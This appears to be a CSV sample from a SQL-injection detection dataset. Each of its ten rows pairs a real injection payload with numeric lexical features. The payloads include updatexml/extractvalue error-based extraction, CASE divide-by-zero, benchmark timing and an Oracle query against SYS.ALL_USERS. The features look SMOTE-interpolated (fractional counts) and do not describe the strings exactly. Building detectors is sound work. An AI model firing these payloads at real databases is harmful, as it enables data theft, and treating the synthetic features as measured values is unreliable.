id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,error,"1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000091,0.5203739974145903,137.81275021837925,25.296812445405187,3.6788388375406114,33.10956266378443,39.0,48.406375109189625,17.296812445405187,0.24015964310371127,0.28304304510968337,0.3512209634679869,0.12557634831861839,0.0,0.0,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,6.296812445405189,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.703187554594811,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7031875545948107
SMOTE_000002,attack,error,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",nearest_attack_euclidean,R000027,1.0923367704290978,161.5775598032867,27.0,3.7011390454576762,36.68886907302606,39.0,60.51095258420851,25.377738146052128,0.2272055759278903,0.24161649616968983,0.37414092517856523,0.15703700272385465,4.0,0.0,0.0,0.0,0.0,2.0,0.0,11.377738146052128,2.0,0.0,6.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.6888690730260638,0.31113092697393624,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000003,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000078,0.011919096869709921,133.0,30.0,3.7782066998059882,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,-4.440892098500626e-16,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-1.3877787807814457e-17,2.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000004,attack,error,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000117,0.3364932214499381,164.0,27.0,3.6434246225423887,36.943187157418166,37.742417123442436,63.62879143827878,25.68560428086061,0.22526333632572054,0.23013668977708804,0.3879804355992609,0.15661953829793054,0.0,4.0,0.0,0.0,0.0,2.0,0.0,12.0,2.0,0.0,5.685604280860611,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000005,attack,error,select   (  case when   (  5322  =  6200  )   then 5322 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000065,0.0,133.0,28.0,3.717153974630355,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,-4.440892098500626e-16,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-1.3877787807814457e-17,2.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000006,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000083,0.7435076484052898,138.3232691962571,24.32326919625708,3.5913680554882137,36.0,35.0,51.0,16.32326919625708,0.2602628666945441,0.2530333426196957,0.3687057278172708,0.11799806286848939,0.32326919625707873,0.0,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,5.0,1.0,0.3232691962570786,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000007,attack,error,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%""  =  """,nearest_attack_euclidean,R000050,1.0474634318909821,160.26093749083802,30.15937500610799,3.7637579814768083,48.847656272904956,27.15234372709504,60.63046874541901,23.63046874541901,0.30543962637195776,0.16889499343731654,0.37829572254893623,0.1473696576417895,0.0,4.0,0.0,0.0,0.0,1.2101562484730026,0.0,12.0,2.0,0.0,4.420312496946005,1.2101562484730028,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.21015624847300285,0.0,-1.3877787807814457e-17,0.0,1.2101562484730026,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7898437515269972,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2101562484730026
SMOTE_000008,attack,error,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000100,0.7737618662173466,144.2742269783453,25.548453956690594,3.584144520506941,36.2742269783453,35.0,55.0,18.0,0.2514184154052343,0.24259588389645184,0.3812221032658529,0.12476359743246095,1.0,0.0,0.0,0.0,0.0,1.0,0.0,11.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.27422697834529647,0.7257730216547035,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000009,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  USERNAME   )    )    FROM SYS.ALL_USERS   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000008,2.403886205306508,130.71242935689278,35.55036556932038,4.1549413338218,67.60438683184452,0.9999999999999964,44.90658024776677,17.201462277281504,0.5200729656553403,0.007784220318193924,0.34030100050505324,0.13184181352141247,3.0,0.0,0.0,0.0,0.0,2.0,0.0,6.201462277281504,0.0,4.449634430679623,-4.440892098500626e-16,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,-1.3877787807814457e-17,1.0,2.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000010,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   -- uslt",nearest_attack_euclidean,R000069,1.152826364649362,144.37118641591505,25.0,3.6548360475474566,37.799152455702696,36.25762716816989,52.31440679204247,18.0,0.26168457436413256,0.2512353226345602,0.36239630051693156,0.12468380248437565,0.0,0.0,1.3711864159150564,0.0,0.0,1.0,0.0,10.314406792042472,0.0,0.0,5.314406792042472,2.3711864159150564,0.0,0.0,0.6855932079575282,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
